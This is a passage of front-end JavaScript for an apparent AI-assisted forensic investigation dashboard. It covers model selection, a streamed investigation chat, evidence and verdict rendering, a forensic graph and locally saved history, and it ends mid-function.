  // Model Selector Dropdown
  // -------------------------------------------------------------------------
  let currentMenuProvider = null;

  function toggleModelMenu(forceState) {
    const isCurrentlyOpen =
      elements.modelDropdownContainer.classList.contains("open") ||
      (elements.modelMenu && elements.modelMenu.classList.contains("open"));
    const shouldOpen =
      forceState !== undefined ? forceState : !isCurrentlyOpen;

    if (shouldOpen) {
      currentMenuProvider = state.activeProvider || "ollama";
      elements.modelDropdownContainer.classList.add("open");
      if (elements.modelMenu) elements.modelMenu.classList.add("open");
      elements.modelSelectorPill.setAttribute("aria-expanded", "true");
      updateMenuTabs();
      renderModelList();
      setTimeout(() => {
        if (elements.modelSearchInput) elements.modelSearchInput.focus();
      }, 50);
    } else {
      elements.modelDropdownContainer.classList.remove("open");
      if (elements.modelMenu) elements.modelMenu.classList.remove("open");
      elements.modelSelectorPill.setAttribute("aria-expanded", "false");
    }
  }

  function updateMenuTabs() {
    const prov = currentMenuProvider || state.activeProvider || "ollama";
    if (elements.tabOllama) {
      elements.tabOllama.classList.toggle("active", prov === "ollama");
    }
    if (elements.tabOpenai) {
      elements.tabOpenai.classList.toggle("active", prov === "openai");
    }
  }

  function updateModelUI() {
    if (elements.activeModelName) {
      elements.activeModelName.textContent = state.activeModel || "gemma4:31b";
    }
    if (elements.activeProviderBadge) {
      elements.activeProviderBadge.textContent = state.activeProvider || "ollama";
    }
    if (elements.inputMetaModel) {
      elements.inputMetaModel.textContent = state.activeModel || "gemma4:31b";
    }
    updateMenuTabs();
  }

  function renderModelList() {
    if (!elements.modelList) return;
    const provider = currentMenuProvider || state.activeProvider || "ollama";
    const filter = (elements.modelSearchInput?.value || "").toLowerCase().trim();
    const rawList = state.models[provider] || [];
    const list = [...rawList];

    // Ensure active model is present in the list if currently browsing its provider
    if (provider === state.activeProvider && state.activeModel && !list.includes(state.activeModel)) {
      list.unshift(state.activeModel);
    }

    elements.modelList.innerHTML = "";
    const filtered = list.filter((m) => m.toLowerCase().includes(filter));

    if (filtered.length === 0) {
      const empty = document.createElement("div");
      empty.className = "history-empty";
      empty.style.padding = "16px";
      empty.textContent = filter
        ? `No ${provider} models matching "${filter}"`
        : `No ${provider} models configured`;
      elements.modelList.appendChild(empty);
      return;
    }

    filtered.forEach((modelName) => {
      const isSelected = provider === state.activeProvider && modelName === state.activeModel;
      const item = document.createElement("div");
      item.className = "model-item" + (isSelected ? " selected" : "");
      item.onclick = (e) => {
        e.stopPropagation();
        selectModel(provider, modelName);
      };

      const info = document.createElement("div");
      info.className = "model-item-info";

      const name = document.createElement("span");
      name.className = "model-item-name";
      name.textContent = modelName;

      const desc = document.createElement("span");
      desc.className = "model-item-desc";
      desc.textContent =
        provider === "ollama" ? "Local / Remote Ollama" : "OpenAI Chat Model";

      info.appendChild(name);
      info.appendChild(desc);

      const check = document.createElement("span");
      check.className = "model-item-check";
      check.textContent = "✓";

      item.appendChild(info);
      item.appendChild(check);
      elements.modelList.appendChild(item);
    });
  }

  async function selectModel(provider, modelName) {
    state.activeProvider = provider;
    state.activeModel = modelName;
    updateModelUI();
    toggleModelMenu(false);

    try {
      const res = await fetch("/api/models/set", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ provider, model: modelName }),
      });
      if (!res.ok) throw new Error("Failed to set model");
      const data = await res.json();
      if (data.active_llm) {
        state.activeProvider = data.active_llm.provider;
        state.activeModel = data.active_llm.model;
        updateModelUI();
      }
    } catch (err) {
      console.warn("Could not sync model to backend:", err);
    }
  }

  function handleCustomModelApply() {
    const custom = elements.customModelInput?.value.trim();
    if (!custom) return;
    const provider = currentMenuProvider || state.activeProvider || "ollama";
    if (state.models[provider] && !state.models[provider].includes(custom)) {
      state.models[provider].push(custom);
    }
    selectModel(provider, custom);
    if (elements.customModelInput) elements.customModelInput.value = "";
  }

  // -------------------------------------------------------------------------
  // Chat & Stream Handling
  // -------------------------------------------------------------------------
  function setupEventListeners() {
    elements.themeToggleBtn.addEventListener("click", toggleTheme);

    if (elements.sidebarCollapseBtn) {
      elements.sidebarCollapseBtn.addEventListener("click", () => toggleSidebar(false));
    }
    if (elements.sidebarToggleBtn) {
      elements.sidebarToggleBtn.addEventListener("click", () => toggleSidebar());
    }
    if (elements.sidebarViewTableBtn) {
      elements.sidebarViewTableBtn.addEventListener("click", () => openGlobalTelemetryTable());
    }

    // Global keyboard shortcuts (Ctrl+B / Cmd+B for sidebar, Esc to close dropdowns)
    window.addEventListener("keydown", (e) => {
      if (e.key === "Escape") {
        toggleModelMenu(false);
      }
      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "b") {
        e.preventDefault();
        toggleSidebar();
      }
    });

    elements.newChatBtn.addEventListener("click", startNewChat);
    elements.clearChatBtn.addEventListener("click", startNewChat);
    elements.clearHistoryBtn.addEventListener("click", clearAllHistory);

    elements.dbSelect.addEventListener("change", onDatabaseChange);

    // Model Dropdown
    if (elements.modelSelectorPill) {
      elements.modelSelectorPill.addEventListener("click", (e) => {
        e.stopPropagation();
        toggleModelMenu();
      });
    }

    if (elements.modelMenu) {
      elements.modelMenu.addEventListener("click", (e) => {
        e.stopPropagation();
      });
    }

    document.addEventListener("click", (e) => {
      if (
        elements.modelDropdownContainer &&
        !elements.modelDropdownContainer.contains(e.target) &&
        (!elements.modelMenu || !elements.modelMenu.contains(e.target))
      ) {
        toggleModelMenu(false);
      }
    });

    if (elements.tabOllama) {
      elements.tabOllama.addEventListener("click", (e) => {
        e.stopPropagation();
        currentMenuProvider = "ollama";
        updateMenuTabs();
        renderModelList();
      });
    }

    if (elements.tabOpenai) {
      elements.tabOpenai.addEventListener("click", (e) => {
        e.stopPropagation();
        currentMenuProvider = "openai";
        updateMenuTabs();
        renderModelList();
      });
    }

    if (elements.modelSearchInput) {
      elements.modelSearchInput.addEventListener("input", renderModelList);
    }

    if (elements.applyCustomModelBtn) {
      elements.applyCustomModelBtn.addEventListener("click", (e) => {
        e.stopPropagation();
        handleCustomModelApply();
      });
    }

    if (elements.customModelInput) {
      elements.customModelInput.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          e.preventDefault();
          e.stopPropagation();
          handleCustomModelApply();
        }
      });
    }

    // Prompt Textarea Auto-resize & Enter to send
    elements.promptInput.addEventListener("input", function () {
      this.style.height = "auto";
      this.style.height = Math.min(this.scrollHeight, 200) + "px";
    });

    elements.promptInput.addEventListener("keydown", function (e) {
      if (e.key === "Enter" && !e.shiftKey) {
        e.preventDefault();
        handleSubmitPrompt();
      }
    });

    elements.sendBtn.addEventListener("click", () => {
      if (state.isGenerating) {
        stopInvestigation();
      } else {
        handleSubmitPrompt();
      }
    });

    // Telemetry Table Header Button click
    if (elements.headerTableBtn) {
      elements.headerTableBtn.addEventListener("click", () => {
        if (activeEvidenceHandler) {
          activeEvidenceHandler.toggleOrOpenTable();
        } else if (latestEvidenceTimeline && latestEvidenceTimeline.length > 0) {
          openGlobalTelemetryTable(latestEvidenceTimeline, "Retrieved Evidence Events");
        } else {
          openGlobalTelemetryTable();
        }
      });
    }

    // Global dialog close button
    if (elements.globalDialogCloseBtn) {
      elements.globalDialogCloseBtn.addEventListener("click", () => {
        if (elements.globalTableDialog) elements.globalTableDialog.close();
      });
    }

    // Suggestions click (support both .suggestion-item and legacy .suggestion-card)
    document.querySelectorAll(".suggestion-item, .suggestion-card").forEach((item) => {
      item.addEventListener("click", async () => {
        const query = item.getAttribute("data-query");
        const dbName = item.getAttribute("data-db");

        // Automatically switch active database if the suggestion targets a different DB
        if (dbName && state.databases && state.databases.length > 0) {
          const matchDb = state.databases.find(
            (d) => d.name === dbName || d.path.endsWith(dbName) || (d.display && d.display.includes(dbName))
          );
          if (matchDb && state.currentDb !== matchDb.name) {
            try {
              const res = await fetch("/api/databases/set", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ db_path: matchDb.path }),
              });
              if (res.ok) {
                state.currentDb = matchDb.name;
                if (elements.headerDbName) elements.headerDbName.textContent = matchDb.name;
                if (elements.inputMetaDb) elements.inputMetaDb.textContent = matchDb.name;
                if (elements.dbSelect) elements.dbSelect.value = matchDb.path;
                updateActiveDbPromptHighlight();
              }
            } catch (err) {
              console.warn("Could not auto-switch database for suggestion:", err);
            }
          }
        }

        if (query) {
          elements.promptInput.value = query;
          switchView("chat");
          handleSubmitPrompt();
        }
      });
    });

    // Prompt Scenarios Category Filter Pills
    document.querySelectorAll(".sugg-filter-pill").forEach((pill) => {
      pill.addEventListener("click", () => {
        document.querySelectorAll(".sugg-filter-pill").forEach((p) => p.classList.remove("active"));
        pill.classList.add("active");
        const filter = pill.getAttribute("data-filter");
        const activeName = state.currentDb || (elements.headerDbName ? elements.headerDbName.textContent.trim() : "");
        let visibleCount = 0;

        document.querySelectorAll(".suggestion-item").forEach((item) => {
          const itemDb = item.getAttribute("data-db") || "";
          const itemCat = item.getAttribute("data-category") || "";
          let isMatch = true;

          if (filter === "active") {
            isMatch = itemDb === activeName || activeName.includes(itemDb) || itemDb.includes(activeName);
          } else if (filter === "attack") {
            isMatch = itemCat === "attack";
          } else if (filter === "benign") {
            isMatch = itemCat === "benign";
          } else if (filter === "eval") {
            isMatch = itemCat === "eval" || itemCat === "inconclusive" || itemCat === "ambiguous";
          } else {
            isMatch = true;
          }

          if (isMatch) {
            item.style.display = "";
            visibleCount++;
          } else {
            item.style.display = "none";
          }
        });

        const countBadge = document.getElementById("suggestionsCountBadge");
        if (countBadge) {
          countBadge.textContent = `${visibleCount} Available`;
        }
      });
    });

    // Workbench View Tabs
    if (elements.tabViewGraph) {
      elements.tabViewGraph.addEventListener("click", () => switchView("graph"));
    }
    if (elements.tabViewChat) {
      elements.tabViewChat.addEventListener("click", () => switchView("chat"));
    }
    if (elements.tabViewReport) {
      elements.tabViewReport.addEventListener("click", () => switchView("report"));
    }

    // Graph Entity Category Filter Pills
    document.querySelectorAll(".filter-pill").forEach((pill) => {
      pill.addEventListener("click", () => {
        document.querySelectorAll(".filter-pill").forEach((p) => p.classList.remove("active"));
        pill.classList.add("active");
        if (forensicGraph) {
          forensicGraph.setFilter(pill.getAttribute("data-filter") || "all");
        }
      });
    });

    // Graph Live Search
    if (elements.graphSearchInput) {
      elements.graphSearchInput.addEventListener("input", (e) => {
        if (forensicGraph) {
          forensicGraph.setSearch(e.target.value);
        }
      });
    }

    // Graph Viewport Controls & Expansion
    if (elements.graphExpandAllBtn) {
      elements.graphExpandAllBtn.addEventListener("click", () => forensicGraph && forensicGraph.expandAll());
    }
    if (elements.graphCollapseAllBtn) {
      elements.graphCollapseAllBtn.addEventListener("click", () => forensicGraph && forensicGraph.collapseAll());
    }
    if (elements.graphZoomInBtn) {
      elements.graphZoomInBtn.addEventListener("click", () => forensicGraph && forensicGraph.zoomIn());
    }
    if (elements.graphZoomOutBtn) {
      elements.graphZoomOutBtn.addEventListener("click", () => forensicGraph && forensicGraph.zoomOut());
    }
    if (elements.graphFitBtn) {
      elements.graphFitBtn.addEventListener("click", () => forensicGraph && forensicGraph.fitToScreen());
    }

    // Entity Inspector Close
    if (elements.inspectorCloseBtn) {
      elements.inspectorCloseBtn.addEventListener("click", () => {
        closeEntityInspector();
        if (forensicGraph) forensicGraph.selectNode(null);
      });
    }

    // Scenario Dropdown Toggle
    if (elements.scenarioDropdownBtn && elements.scenarioMenu) {
      elements.scenarioDropdownBtn.addEventListener("click", (e) => {
        e.stopPropagation();
        elements.scenarioMenu.classList.toggle("show");
      });
      document.addEventListener("click", () => {
        elements.scenarioMenu.classList.remove("show");
      });
    }

    // Scenario Menu Items Click
    document.querySelectorAll(".scenario-menu-item").forEach((btn) => {
      btn.addEventListener("click", () => {
        const scType = btn.getAttribute("data-scenario");
        const events = SAMPLE_SCENARIOS[scType];
        if (events && events.length) {
          loadTimelineIntoGraph(events);
          switchView("graph");
          if (elements.scenarioMenu) elements.scenarioMenu.classList.remove("show");
        }
      });
    });

    // Report Stage Copy Button
    if (elements.reportStageCopyBtn) {
      elements.reportStageCopyBtn.addEventListener("click", () => {
        const content = elements.reportStageContent ? elements.reportStageContent.innerText : "";
        if (content) {
          navigator.clipboard.writeText(content);
          const span = elements.reportStageCopyBtn.querySelector("span");
          if (span) {
            span.textContent = "Copied!";
            setTimeout(() => (span.textContent = "Copy Markdown"), 1800);
          }
        }
      });
    }
  }

  function startNewChat() {
    if (state.isGenerating) stopInvestigation();
    elements.messagesContainer.innerHTML = "";
    elements.welcomeScreen.style.display = "flex";
    elements.promptInput.value = "";
    elements.promptInput.style.height = "auto";
    state.currentSessionId = null;
    activeEvidenceHandler = null;
    latestEvidenceTimeline = null;
    if (elements.headerTableBadge) {
      elements.headerTableBadge.textContent = "Telemetry Table";
    }
    if (elements.graphNodeCountBadge) {
      elements.graphNodeCountBadge.textContent = "0";
    }
    if (elements.graphLiveStatus) {
      elements.graphLiveStatus.textContent = "Graph Ready";
    }
    if (elements.reportStageVerdictTag) {
      elements.reportStageVerdictTag.className = "verdict-tag";
      elements.reportStageVerdictTag.textContent = "No Report Generated";
    }
    if (elements.reportStageVerdictTime) {
      elements.reportStageVerdictTime.textContent = "Run an investigation to generate a verified incident report";
    }
    if (elements.reportStageContent) {
      elements.reportStageContent.innerHTML = '<div class="history-empty" style="padding:60px 20px;">No investigation report generated yet. Submit a query below or select a sample investigation from the suggestions to begin.</div>';
    }
    closeEntityInspector();
    if (forensicGraph) {
      forensicGraph.loadTimeline([]);
    }
    switchView("chat");
    document.querySelectorAll(".history-item").forEach((i) => i.classList.remove("active"));
  }

  async function handleSubmitPrompt() {
    const query = elements.promptInput.value.trim();
    if (!query || state.isGenerating) return;

    elements.welcomeScreen.style.display = "none";
    elements.promptInput.value = "";
    elements.promptInput.style.height = "auto";
    switchView("chat");

    // 1. Render User Message
    renderUserMessage(query);

    // 2. Prepare Assistant Message Box with Live Stepper
    const assistantMsg = createAssistantMessageElement();
    elements.messagesContainer.appendChild(assistantMsg.container);
    scrollToBottom(true);

    // 3. Start Investigation SSE Stream
    state.isGenerating = true;
    updateSendBtnState(true);

    const sessionId = "sess-" + Date.now();
    state.currentSessionId = sessionId;

    try {
      const response = await fetch("/api/investigate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          query: query,
          provider: state.activeProvider,
          model: state.activeModel,
          db_path: elements.dbSelect.value || undefined,
        }),
      });

      if (!response.ok) {
        throw new Error(`Server returned HTTP ${response.status}`);
      }

      const reader = response.body.getReader();
      const decoder = new TextDecoder("utf-8");
      let buffer = "";

      while (true) {
        const { value, done } = await reader.read();
        if (done) break;

        buffer += decoder.decode(value, { stream: true });
        const lines = buffer.split("\n\n");
        buffer = lines.pop(); // Keep last partial chunk

        for (const block of lines) {
          const trimmed = block.trim();
          if (trimmed.startsWith("data: ")) {
            const jsonStr = trimmed.slice(6);
            try {
              const event = JSON.parse(jsonStr);
              handleStreamEvent(event, assistantMsg);
            } catch (err) {
              console.warn("SSE JSON Parse error:", err, jsonStr);
            }
          }
        }
      }

      // Process any trailing SSE data in residual buffer
      if (buffer && buffer.trim()) {
        const blocks = buffer.split("\n\n");
        for (const block of blocks) {
          const trimmed = block.trim();
          if (trimmed.startsWith("data: ")) {
            const jsonStr = trimmed.slice(6);
            try {
              const event = JSON.parse(jsonStr);
              handleStreamEvent(event, assistantMsg);
            } catch (err) {
              console.warn("SSE residual JSON Parse error:", err, jsonStr);
            }
          }
        }
      }

      // Finalize and save to history
      saveInvestigationSession(sessionId, query, assistantMsg.state);
    } catch (err) {
      console.error("Stream error:", err);
      assistantMsg.setErrorMessage(err.message);
    } finally {
      state.isGenerating = false;
      updateSendBtnState(false);
      scrollToBottom();
    }
  }

  async function stopInvestigation() {
    try {
      await fetch("/api/cancel", { method: "POST" });
    } catch (e) {
      console.warn("Cancel request failed", e);
    }
    state.isGenerating = false;
    updateSendBtnState(false);
  }

  function updateSendBtnState(isGenerating) {
    if (isGenerating) {
      elements.sendBtn.classList.add("generating");
      elements.sendBtn.title = "Stop investigation";
    } else {
      elements.sendBtn.classList.remove("generating");
      elements.sendBtn.title = "Send message";
    }
  }

  // -------------------------------------------------------------------------
  // Message Components & UI Rendering
  // -------------------------------------------------------------------------
  function renderUserMessage(text) {
    const row = document.createElement("div");
    row.className = "message-row user";

    const bubble = document.createElement("div");
    bubble.className = "user-bubble";
    bubble.textContent = text;

    row.appendChild(bubble);
    elements.messagesContainer.appendChild(row);
  }

  function createAssistantMessageElement() {
    const row = document.createElement("div");
    row.className = "message-row assistant";

    const avatar = document.createElement("div");
    avatar.className = "message-avatar";
    avatar.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>`;

    const content = document.createElement("div");
    content.className = "assistant-content";

    // Stepper
    const stepper = document.createElement("div");
    stepper.className = "investigation-stepper";
    stepper.innerHTML = `
      <div class="step-item active" id="st-prep"><div class="step-dot"></div><span>Alert Prep</span></div>
      <span class="step-separator">›</span>
      <div class="step-item" id="st-triage"><div class="step-dot"></div><span>Triage Plan</span></div>
      <span class="step-separator">›</span>
      <div class="step-item" id="st-loop"><div class="step-dot"></div><span>Telemetry</span></div>
      <span class="step-separator">›</span>
      <div class="step-item" id="st-pack"><div class="step-dot"></div><span>Evidence Pack</span></div>
      <span class="step-separator">›</span>
      <div class="step-item" id="st-report"><div class="step-dot"></div><span>Verdict</span></div>
    `;

    // Hypotheses Container
    const hypothesesBox = document.createElement("div");
    hypothesesBox.className = "hypotheses-box";
    hypothesesBox.style.display = "none";
    hypothesesBox.innerHTML = `
      <div class="hypotheses-title">Triage Hypotheses</div>
      <div class="hypotheses-list"></div>
    `;

    // Retrieved Evidence Timeline
    const evidenceBox = document.createElement("section");
    evidenceBox.className = "evidence-pack-box";
    evidenceBox.style.display = "none";
    evidenceBox.innerHTML = `
      <div class="evidence-pack-heading">
        <div>
          <div class="hypotheses-title">Retrieved Evidence</div>
          <div class="evidence-pack-meta"></div>
        </div>
        <div class="table-option-group" role="group" aria-label="Data table display options">
          <button class="action-pill-btn evidence-open-graph-btn" type="button" title="View Process Tree in Forensic Graph">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>
            <span>Forensic Graph</span>
          </button>
          <button class="action-pill-btn evidence-open-table-btn" type="button" title="Open Telemetry Table Modal">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="3" y="3" width="18" height="18" rx="2"></rect><path d="M3 9h18M3 15h18M9 3v18m6-18v18"></path></svg>
            <span>Telemetry Table</span>
          </button>
        </div>
      </div>
      <div class="evidence-hypotheses"></div>
    `;

    const btnOpenGraph = evidenceBox.querySelector(".evidence-open-graph-btn");
    if (btnOpenGraph) {
      btnOpenGraph.addEventListener("click", () => {
        const timeline = internalState.evidencePack && Array.isArray(internalState.evidencePack.timeline)
          ? internalState.evidencePack.timeline
          : [];
        if (timeline.length) {
          loadTimelineIntoGraph(timeline);
          switchView("graph");
        }
      });
    }

    const btnOpenTable = evidenceBox.querySelector(".evidence-open-table-btn");
    btnOpenTable.addEventListener("click", () => {
      const timeline = internalState.evidencePack && Array.isArray(internalState.evidencePack.timeline)
        ? internalState.evidencePack.timeline
        : [];
      openGlobalTelemetryTable(timeline, "Retrieved Evidence Events");
    });

    // Telemetry & Steps Accordion
    const traceBox = document.createElement("div");
    traceBox.className = "telemetry-trace";
    traceBox.innerHTML = `
      <button class="telemetry-toggle">
        <span>Investigation Telemetry Trace <span class="trace-count-pill">0 steps</span></span>
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"></polyline></svg>
      </button>
      <div class="telemetry-body" style="display: none;"></div>
    `;

    const toggleBtn = traceBox.querySelector(".telemetry-toggle");
    const traceBody = traceBox.querySelector(".telemetry-body");
    const countPill = traceBox.querySelector(".trace-count-pill");

    toggleBtn.addEventListener("click", () => {
      const isHidden = traceBody.style.display === "none";
      traceBody.style.display = isHidden ? "flex" : "none";
      toggleBtn.querySelector("svg").style.transform = isHidden
        ? "rotate(180deg)"
        : "rotate(0deg)";
    });

    // Verdict Banner
    const verdictBanner = document.createElement("div");
    verdictBanner.className = "verdict-banner";
    verdictBanner.style.display = "none";

    // Markdown Report Container
    const reportBox = document.createElement("div");
    reportBox.className = "report-markdown";

    // Report Actions
    const reportActions = document.createElement("div");
    reportActions.className = "report-actions";
    reportActions.style.display = "none";
    reportActions.innerHTML = `
      <button class="action-pill-btn copy-report-btn">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
        <span>Copy Report</span>
      </button>
    `;

    content.appendChild(stepper);
    content.appendChild(hypothesesBox);
    content.appendChild(evidenceBox);
    content.appendChild(traceBox);
    content.appendChild(verdictBanner);
    content.appendChild(reportBox);
    content.appendChild(reportActions);

    row.appendChild(avatar);
    row.appendChild(content);

    const internalState = {
      stepCount: 0,
      reportMarkdown: "",
      verdict: "",
      hypotheses: [],
    };

    const copyBtn = reportActions.querySelector(".copy-report-btn");
    copyBtn.addEventListener("click", () => {
      if (internalState.reportMarkdown) {
        navigator.clipboard.writeText(internalState.reportMarkdown);
        copyBtn.querySelector("span").textContent = "Copied!";
        setTimeout(() => {
          copyBtn.querySelector("span").textContent = "Copy Report";
        }, 2000);
      }
    });

    return {
      container: row,
      state: internalState,
      setStepActive: (stepId) => {
        const ids = ["st-prep", "st-triage", "st-loop", "st-pack", "st-report"];
        let passed = true;
        ids.forEach((id) => {
          const el = stepper.querySelector("#" + id);
          if (!el) return;
          if (id === stepId) {
            el.className = "step-item active";
            passed = false;
          } else if (passed) {
            el.className = "step-item done";
          } else {
            el.className = "step-item";
          }
        });
      },
      addHypotheses: (hypos) => {
        internalState.hypotheses = hypos;
        hypothesesBox.style.display = "block";
        const list = hypothesesBox.querySelector(".hypotheses-list");
        list.innerHTML = "";
        hypos.forEach((h, idx) => {
          const item = document.createElement("div");
          item.className = "hypo-item";
          item.innerHTML = `<span class="hypo-badge">H${idx + 1}:</span><span>${escapeHtml(h)}</span>`;
          list.appendChild(item);
        });
      },
      setEvidencePack: (pack) => {
        internalState.evidencePack = pack;
        const timeline = Array.isArray(pack.timeline) ? pack.timeline : [];
        latestEvidenceTimeline = timeline;

        activeEvidenceHandler = {
          toggleOrOpenTable: () => {
            openGlobalTelemetryTable(timeline, "Retrieved Evidence Events");
          }
        };

        const totalCount = pack.total_kept_events ?? timeline.length;
        if (elements.headerTableBadge) {
          elements.headerTableBadge.textContent = `${totalCount} events`;
        }

        evidenceBox.style.display = "block";
        const countText = `${totalCount} events retained; ${pack.excluded_count ?? 0} rows filtered`;
        const packMeta = evidenceBox.querySelector(".evidence-pack-meta");
        if (packMeta) packMeta.textContent = countText;

        const hypothesisList = evidenceBox.querySelector(".evidence-hypotheses");
        if (hypothesisList) {
          hypothesisList.replaceChildren();
          Object.entries(pack.hypotheses_evidence || {}).forEach(([hypothesis, evidence]) => {
            const row = document.createElement("div");
            row.className = "evidence-hypothesis";
            row.textContent = `${evidence.event_count || 0} candidate event(s): ${hypothesis}`;
            hypothesisList.appendChild(row);
          });
        }

        // Populate and sync Forensic Graph
        if (timeline.length > 0) {
          loadTimelineIntoGraph(timeline);
        }
      },
      addTraceStep: (toolName, summary) => {
        internalState.stepCount++;
        countPill.textContent = `${internalState.stepCount} step(s)`;
        const rowEl = document.createElement("div");
        rowEl.className = "trace-row";
        rowEl.innerHTML = `
          <div class="trace-row-header">
            <span class="trace-tool-name">${escapeHtml(toolName)}</span>
            <span style="font-size:10px; color:var(--text-faint);">#${internalState.stepCount}</span>
          </div>
          <div class="trace-summary">${escapeHtml(summary)}</div>
        `;
        traceBody.appendChild(rowEl);
        traceBody.scrollTop = traceBody.scrollHeight;
      },
      addReasoning: (text) => {
        if (!text) return;
        const cleaned = String(text)
          .replace(/<\|?channel[^>]*\|?>/gi, "")
          .replace(/<\/?think>/gi, "")
          .replace(/<\/?thought>/gi, "")
          .trim();
        if (!cleaned) return;
        const rowEl = document.createElement("div");
        rowEl.className = "trace-reasoning";
        rowEl.textContent = cleaned;
        traceBody.appendChild(rowEl);
        traceBody.scrollTop = traceBody.scrollHeight;
      },
      setVerdict: (verdict, boundary, confidence) => {
        const cleanVerdict = String(verdict || "inconclusive").toLowerCase().trim();
        const confStr = formatConfidence(confidence);
        const confVal = parseFloat(confStr) / 100;

        internalState.verdict = cleanVerdict;
        internalState.verdict_boundary = boundary || "";
        internalState.confidence = confVal;

        verdictBanner.className = `verdict-banner ${cleanVerdict}`;
        verdictBanner.style.display = "flex";
        verdictBanner.innerHTML = `
          <div class="verdict-left">
            <div class="verdict-title">${escapeHtml(cleanVerdict)}</div>
            ${boundary ? `<div class="verdict-boundary">${escapeHtml(boundary)}</div>` : ""}
          </div>
          <div class="verdict-confidence">Confidence: ${confStr}</div>
        `;

        if (elements.reportStageVerdictTag) {
          elements.reportStageVerdictTag.className = `verdict-tag ${cleanVerdict}`;
          elements.reportStageVerdictTag.textContent = `Verdict: ${cleanVerdict.toUpperCase()}`;
        }
        if (elements.reportStageVerdictTime) {
          elements.reportStageVerdictTime.textContent = `Confidence: ${confStr} ${boundary ? '· ' + boundary : ''}`;
        }
      },
      setReport: (markdown) => {
        internalState.reportMarkdown = markdown;
        const rendered = renderMarkdown(markdown);
        reportBox.innerHTML = rendered;
        reportActions.style.display = "flex";

        if (elements.reportStageContent) {
          elements.reportStageContent.innerHTML = rendered;
        }
        scrollToBottom(true);
      },
      setErrorMessage: (msg) => {
        reportBox.innerHTML = `<div style="color:var(--verdict-malicious-text); padding:10px; background:var(--verdict-malicious-bg); border-radius:8px;">⚠️ ${escapeHtml(msg)}</div>`;
      },
    };
  }

  function handleStreamEvent(event, assistantMsg) {
    switch (event.type) {
      case "start":
        assistantMsg.setStepActive("st-prep");
        break;

      case "alert_prep":
        assistantMsg.setStepActive("st-triage");
        break;

      case "triage":
        assistantMsg.setStepActive("st-loop");
        if (event.data && event.data.hypotheses) {
          assistantMsg.addHypotheses(event.data.hypotheses);
        }
        break;

      case "loop":
        assistantMsg.setStepActive("st-loop");
        break;

      case "evidence_pack":
        assistantMsg.setStepActive("st-pack");
        assistantMsg.setEvidencePack(event.data || {});
        break;

      case "tool_call":
        const tc = event.data;
        const argStr = JSON.stringify(tc.args || {});
        assistantMsg.addTraceStep(
          `Invoking ${tc.tool}`,
          argStr.length > 120 ? argStr.slice(0, 117) + "..." : argStr
        );
        break;

      case "tool_result":
        assistantMsg.addTraceStep(event.data.tool, event.data.summary);
        break;

      case "thought":
      case "reasoning":
        assistantMsg.addReasoning(event.text);
        break;

      case "complete":
        assistantMsg.setStepActive("st-report");
        const res = event.data;
        if (res.verdict) {
          assistantMsg.setVerdict(
            res.verdict,
            res.verdict_boundary,
            res.confidence || 0.0
          );
        }
        if (res.report) {
          assistantMsg.setReport(res.report);
        }
        // Ensure activeEvidenceHandler and top bar button are hooked to the latest evidence
        if (assistantMsg.state?.evidencePack?.timeline) {
          latestEvidenceTimeline = assistantMsg.state.evidencePack.timeline;
          activeEvidenceHandler = {
            toggleOrOpenTable: () => {
              openGlobalTelemetryTable(latestEvidenceTimeline, "Retrieved Evidence Events");
            }
          };
          if (elements.headerTableBadge) {
            elements.headerTableBadge.textContent = `${latestEvidenceTimeline.length} events`;
          }
        }
        scrollToBottom(true);
        break;

      case "error":
        assistantMsg.setErrorMessage(event.message || "An unexpected error occurred.");
        break;
    }
    scrollToBottom(false);
  }

  // -------------------------------------------------------------------------
  // Local History Management
  // -------------------------------------------------------------------------
  function loadSavedHistory() {
    try {
      const raw = localStorage.getItem("a1_dfir_history");
      if (raw) {
        state.history = JSON.parse(raw);
        renderHistoryList();
      }
    } catch (e) {
      console.warn("Could not load history", e);
    }
  }

  function saveInvestigationSession(id, query, sessionState) {
    const item = {
      id: id,
      query: query,
      timestamp: Date.now(),
      verdict: sessionState.verdict,
      verdict_boundary: sessionState.verdict_boundary || "",
      confidence: sessionState.confidence || 0.85,
      report: sessionState.reportMarkdown,
      model: state.activeModel,
      db: state.currentDb,
      hypotheses: sessionState.hypotheses,
      evidencePack: sessionState.evidencePack,
    };
    state.history.unshift(item);
    if (state.history.length > 25) state.history.pop();
    try {
      localStorage.setItem("a1_dfir_history", JSON.stringify(state.history));
      renderHistoryList();
    } catch (e) {
      console.warn("Could not save history to localStorage", e);
    }
  }

  function renderHistoryList() {
    elements.historyList.innerHTML = "";
    if (state.history.length === 0) {
      elements.historyList.innerHTML = `<div class="history-empty">No previous investigations</div>`;
      return;
    }

    state.history.forEach((item) => {
      const el = document.createElement("div");
      el.className = "history-item" + (item.id === state.currentSessionId ? " active" : "");

      const span = document.createElement("span");
      span.textContent = item.query;
      span.title = item.query;

      const delBtn = document.createElement("button");
      delBtn.className = "history-del-btn";
      delBtn.innerHTML = "×";
      delBtn.title = "Delete this investigation";
      delBtn.onclick = (e) => {
        e.stopPropagation();
        deleteHistoryItem(item.id);
      };

      el.appendChild(span);
      el.appendChild(delBtn);

      el.onclick = () => loadHistoryItem(item);
      elements.historyList.appendChild(el);
    });
  }

  function deleteHistoryItem(id) {
